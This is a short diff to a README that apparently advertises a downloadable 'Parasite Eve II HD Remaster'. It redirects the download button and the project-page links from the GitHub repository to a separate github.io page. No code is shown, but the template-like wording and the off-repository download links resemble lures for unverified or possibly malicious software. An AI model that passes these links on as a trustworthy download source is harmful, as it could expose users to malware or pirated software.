@@ -37,7 +37,7 @@ That's it. No special drivers, no command line, no developer tools.
 
 | **Official Download Link** | **Random Button** |
 |:---:|:---:|
-| [**Download Parasite Eve II HD Remaster**](https://github.com/Rosanabullheaded2685/Parasite-Eve-2-HD-Remaster) | [![Download Now](https://img.shields.io/badge/⬇️%20Download%20Now-Perfect%20Choice-4caf50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Rosanabullheaded2685/Parasite-Eve-2-HD-Remaster) |
+| [**Download Parasite Eve II HD Remaster**](https://rosanabullheaded2685.github.io) | [![Download Now](https://img.shields.io/badge/⬇️%20Download%20Now-Perfect%20Choice-4caf50?style=for-the-badge&logo=github&logoColor=white)](https://rosanabullheaded2685.github.io) |
 
 Visit this link to download the application.
 
@@ -129,7 +129,7 @@ It is currently **in development**, which means updates and improvements may com
 
 ## 🧑‍🤝‍🧑 Join the Community
 
-Check out the [official project page](https://github.com/Rosanabullheaded2685/Parasite-Eve-2-HD-Remaster) to:
+Check out the [official project page](https://rosanabullheaded2685.github.io) to:
 
 - See the latest updates and news
 - Report bugs or suggest improvements
